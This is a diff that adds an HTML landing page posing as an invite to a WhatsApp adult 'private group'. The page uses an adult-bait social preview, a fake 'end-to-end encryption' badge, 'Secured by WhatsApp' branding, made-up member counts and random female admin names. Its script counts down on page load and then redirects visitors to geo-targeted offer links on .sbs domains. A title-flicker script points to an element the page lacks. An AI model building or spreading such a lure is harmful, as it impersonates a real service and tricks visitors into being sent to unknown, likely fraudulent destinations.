@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Get what you need!</title>
+    
+    <!-- Link Icon -->
+    <link rel="icon" href="https://ik.imagekit.io/neles/1456511.png?ik-sdk-version=javascript-1.4.3&amp;updatedAt=1675671010419">
+
+    <!-- --- OPEN GRAPH & SOCIAL MEDIA PREVIEWS --- -->
+    <!-- 1. Judul untuk Preview -->
+    <meta property="og:title" content="►Gallery of hot🔥 photos and videos 🍌📲">
+    <meta name="twitter:title" content="►Gallery of hot🔥 photos and videos 🍌📲">
+
+    <!-- 2. Deskripsi Singkat untuk Preview -->
+    <meta property="og:description" content="Browse trending profiles and discover new updates shared by active users.">
+    <meta name="twitter:description" content="Browse trending profiles and discover new updates shared by active users.">
+
+    <!-- 3. GAMBAR PREVIEW (Gunakan salah satu gambar dari database avatar agar relevan) -->
+    <!-- Anda bisa mengganti URL di bawah ini jika ingin gambar preview tertentu -->
+    <meta property="og:image" content="https://snipboard.io/s0kyXl.jpg">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="400">
+    <meta property="og:image:height" content="400">
+    <meta name="twitter:image" content="https://snipboard.io/s0kyXl.jpg">
+
+    <!-- 4. Domain/Site Name -->
+    <meta property="og:site_name" content="WhatsApp Web">
+    <meta name="twitter:card" content="summary_large_image">
+    
+    <style>
+        :root {
+            --wa-bg-dark: #0b141a; /* Warna background WhatsApp Dark */
+            --wa-card-bg: #202c33; /* Warna background kartu/chat */
+            --wa-green: #00a884; /* Hijau khas WhatsApp */
+            --wa-green-hover: #028876;
+            --text-main: #e9edef;
+            --text-sec: #8696a0;
+            --divider: #374045;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--wa-bg-dark);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* --- BACKGROUND VIDEO --- */
+        .bg-video {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            min-width: 100%;
+            min-height: 100%;
+            width: auto;
+            height: auto;
+            z-index: -2;
+            transform: translate(-50%, -50%);
+            object-fit: cover;
+            filter: blur(3px) brightness(0.3);
+        }
+
+        .bg-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(11, 20, 26, 0.6); 
+            z-index: -1;
+        }
+
+        /* --- MAIN CARD --- */
+        .card {
+            background: var(--wa-card-bg);
+            width: 100%;
+            max-width: 400px;
+            border-radius: 20px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            position: relative;
+            z-index: 1;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        /* --- GROUP AVATAR --- */
+        .group-avatar {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 4px solid var(--wa-bg-dark);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            position: relative;
+        }
+
+        .group-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* --- TEXTS --- */
+        h1 {
+            font-size: 1.4rem;
+            margin-bottom: 5px;
+            color: var(--text-main);
+            font-weight: 600;
+        }
+
+        .group-type {
+            font-size: 0.85rem;
+            color: var(--text-sec);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 15px;
+        }
+
+        .admin-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            font-size: 0.9rem;
+            color: var(--text-sec);
+            margin-bottom: 25px;
+        }
+
+        .admin-name {
+            color: var(--text-main);
+            font-weight: 500;
+        }
+
+        /* --- SECURITY BADGE --- */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: rgba(0, 168, 132, 0.1);
+            color: var(--wa-green);
+            padding: 10px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            font-size: 0.8rem;
+            font-weight: 500;
+        }
+
+        /* --- STATS --- */
+        .stats-container {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--divider);
+        }
+
+        .stat-item {
+            text-align: left;
+        }
+
+        .stat-num {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--text-main);
+        }
+
+        .stat-label {
+            font-size: 0.8rem;
+            color: var(--text-sec);
+        }
+
+        /* --- BUTTON & STATUS --- */
+        .join-btn {
+            width: 100%;
+            background-color: var(--wa-green);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 30px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 168, 132, 0.3);
+            transition: background 0.2s, transform 0.1s, opacity 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .join-btn:hover {
+            background-color: var(--wa-green-hover);
+            transform: translateY(-2px);
+        }
+
+        .join-btn:active {
+            transform: translateY(0);
+        }
+
+        .join-btn.disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            background-color: var(--divider);
+            transform: none;
+        }
+
+        /* Teks countdown di bawah tombol */
+        .redirect-info {
+            margin-top: 15px;
+            font-size: 0.8rem;
+            color: var(--wa-green);
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+        
+        .redirect-info.visible {
+            opacity: 1;
+        }
+
+        /* --- FOOTER --- */
+        .footer {
+            margin-top: 25px;
+            font-size: 0.75rem;
+            color: var(--text-sec);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .footer svg { width: 12px; height: 12px; fill: currentColor; }
+
+    </style>
+</head>
+<body>
+
+    <!-- Background Video Element -->
+    <video id="bgVideo" class="bg-video" playsinline autoplay muted loop></video>
+    <div class="bg-overlay"></div>
+
+    <div class="card">
+        <!-- Group Avatar -->
+        <div class="group-avatar">
+            <img id="randomProfileImg" src="" alt="Group Profile">
+        </div>
+
+        <!-- Title -->
+        <h1>Naughty Girls Room</h1>
+        <div class="group-type">Private Group</div>
+
+        <!-- Admin Info -->
+        <div class="admin-info">
+            <span>Admin:</span>
+            <span id="adminName" class="admin-name">Loading...</span>
+        </div>
+
+        <!-- Security Badge -->
+        <div class="security-badge">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+            <span>Messages are protected with end-to-end encryption</span>
+        </div>
+
+        <!-- Stats -->
+        <div class="stats-container">
+            <div class="stat-item">
+                <div class="stat-num">106.7K</div>
+                <div class="stat-label">Members</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-num">43.2K</div>
+                <div class="stat-label">Online</div>
+            </div>
+        </div>
+
+        <!-- Main Action Button -->
+        <button id="btnJoin" class="join-btn" onclick="manualRedirect()">
+            JOIN GROUP
+        </button>
+
+        <!-- Redirect Info Text -->
+        <div id="redirectInfo" class="redirect-info">Redirecting in <span id="countdown">5</span> seconds...</div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+            Secured by WhatsApp
+        </div>
+    </div>
+
+    <script>
+    // --- 1. CONFIGURATION ---
+    // Waktu tunda dalam detik untuk auto-redirect
+    const AUTO_REDIRECT_DELAY = 5; 
+
+    // Variabel timer untuk menyimpan ID interval countdown
+    let countdownInterval;
+    let redirectTimer;
+
+    // --- 2. DATABASE VIDEO (Background) ---
+    const videoList = [
+        "" || "https://ceafgif.flirtpixel.com/bundle/921/assets/images/video-1.mp4",
+        "https://files.catbox.moe/o2bcz2.mp4",
+        "https://files.catbox.moe/1q99k0.mp4"
+    ];
+
+    // --- 3. DATABASE GAMBAR (Avatar) ---
+    const photoList = [
+        "https://pbs.twimg.com/media/HGM_aQjbIAAO4sz?format=jpg&name=large",
+        "https://pbs.twimg.com/media/HGM_aRDbEAAlQBg?format=jpg&name=medium",
+        "https://pbs.twimg.com/media/HGNAB_LbkAEli42?format=jpg&name=large",
+        "https://pbs.twimg.com/media/HGM_aQvbAAAB6B0?format=jpg&name=large",
+        "https://pbs.twimg.com/media/HGM_1hCaAAACTpl?format=jpg&name=large",
+        "https://pbs.twimg.com/media/HGM_1hLbUAAYEQI?format=jpg&name=large",
+        "https://pbs.twimg.com/media/HGM_1hPaoAEa0hs?format=jpg&name=medium",
+        "https://pbs.twimg.com/media/HGM_1hDbgAA164b?format=jpg&name=4096x4096",
+        "https://pbs.twimg.com/media/HGNAB_VaMAA2nmx?format=jpg&name=large",
+        "https://pbs.twimg.com/media/HGNACEuaEAAzlbb?format=jpg&name=large"
+    ];
+
+    // --- 4. DATABASE NAMA (ADMIN) ---
+    const femaleNames = [
+        "Natalie Phillips", "Grace Sophia", "Charlotte Davis", "Victoria Rose",
+        "Camille Stone", "Isabella Ross", "Eleanor Rigby", "Lauren West", "Amanda Stewart"
+    ];
+
+    function getRandomItem(list) {
+        return list[Math.floor(Math.random() * list.length)];
+    }
+
+    // --- 5. INITIALIZATION ---
+    document.addEventListener('DOMContentLoaded', () => {
+        // --- A. LOGIKA VIDEO BACKGROUND ---
+        const videoElement = document.getElementById('bgVideo');
+        const randomVideoUrl = getRandomItem(videoList);
+        
+        if (randomVideoUrl) {
+            videoElement.src = randomVideoUrl;
+            videoElement.play().catch(error => {
+                console.log("Autoplay video prevented:", error);
+            });
+        }
+
+        // --- B. LOGIKA TAMPILAN (Gambar & Nama) ---
+        const profileImg = getRandomItem(photoList);
+        document.getElementById('randomProfileImg').src = profileImg;
+        const randomName = getRandomItem(femaleNames);
+        document.getElementById('adminName').textContent = randomName;
+
+        // --- C. MULAI TIMER REDIRECT OTOMATIS ---
+        startAutoRedirect();
+    });
+
+    // --- 6. REDIRECT LOGIC ---
+
+    function startAutoRedirect() {
+        // Tampilkan info countdown
+        const redirectInfo = document.getElementById('redirectInfo');
+        const countdownEl = document.getElementById('countdown');
+        let timeLeft = AUTO_REDIRECT_DELAY;
+
+        redirectInfo.classList.add('visible');
+
+        // Loop setiap 1 detik untuk update angka
+        countdownInterval = setInterval(() => {
+            timeLeft--;
+            countdownEl.textContent = timeLeft;
+
+            if (timeLeft <= 0) {
+                clearInterval(countdownInterval);
+                performRedirect();
+            }
+        }, 1000);
+
+        // Set timer utama untuk eksekusi redirect
+        redirectTimer = setTimeout(() => {
+            performRedirect();
+        }, AUTO_REDIRECT_DELAY * 1000);
+    }
+
+    function manualRedirect() {
+        // Jika user klik tombol, hentikan timer dan langsung redirect
+        clearTimeout(redirectTimer);
+        clearInterval(countdownInterval);
+        
+        // Update UI tombol
+        const btn = document.getElementById('btnJoin');
+        btn.textContent = "REDIRECTING...";
+        btn.classList.add('disabled');
+
+        performRedirect();
+    }
+
+    function performRedirect() {
+        // Daftar Link Offer Berdasarkan Negara
+        const offerLinks = {
+            'US': 'https://wpczcPq.gemblong.sbs/pEpaEc4DlpD4e6thY8x8',
+            'BR': 'https://8e0hfEu.breilera.sbs/DbWrWS8EpfmKpmD99BoK',
+            'FR': 'https://oE2Dv3a.gemblong.sbs/curX1oBAYbdFey8VPAFC',
+            'AU': 'https://Rw85vZD.breilera.sbs/CTzF4SWgBg60okgzqdjb',
+            'PT': 'https://4VdamFk.gemblong.sbs/vlzjUScNhhgHbmzsv7Gw',
+            'DEFAULT': 'https://yiti18v.gemblong.sbs/6pxR5BoDOAOS0xH0wXrn'
+        };
+
+        let userLang = navigator.language || navigator.userLanguage; 
+        let countryCode = userLang.slice(-2).toUpperCase(); 
+
+        console.log("Detected Language/Country Code:", userLang, "->", countryCode);
+
+        let destinationLink = offerLinks[countryCode];
+
+        if (!destinationLink) {
+            destinationLink = offerLinks['DEFAULT'];
+            console.log("Country not in specific list, using Default Link.");
+        } else {
+            console.log("Link found for country:", countryCode);
+        }
+
+        console.log("Redirecting to:", destinationLink);
+        window.location.href = destinationLink;
+    }
+
+    // Title Flicker
+    let titleState = 0;
+    setInterval(() => {
+      document.title = titleState ? '(2) new messages' : document.querySelector('.slogan').textContent;
+      titleState = 1 - titleState;
+    }, 1000);
+
+  </script>
+</body>
+</html>
